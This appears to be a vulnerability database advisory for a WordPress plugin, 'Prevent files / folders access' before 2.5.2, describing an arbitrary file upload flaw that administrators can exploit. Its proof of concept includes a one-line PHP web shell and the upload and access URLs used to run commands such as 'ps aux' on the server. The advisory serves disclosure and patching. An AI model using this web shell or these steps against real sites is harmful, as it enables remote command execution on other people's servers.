## WordPress Plugin Vulnerabilities

# Prevent files / folders access < 2.5.2 - Admin+ Arbitrary File Upload

### Description

The plugin does not validate files to be uploaded, which could allow attackers to upload arbitrary files such as PHP on the server.

### Proof of Concept

1) Create a PHP file `cmd.php` with the contents `<?php system($\_GET['cmd']); ?>`
2) Go to https://example.com/wp-admin/admin.php?page=mo\_media\_restrict&tab=private\_directory
3) Then upload a file with the PHP extension
4) Follow the link https://example.com/wp-content/uploads/protectedfiles/{filename}.php?cmd=ps+aux
5) You will be able to see a list of processes when the PHP is executed
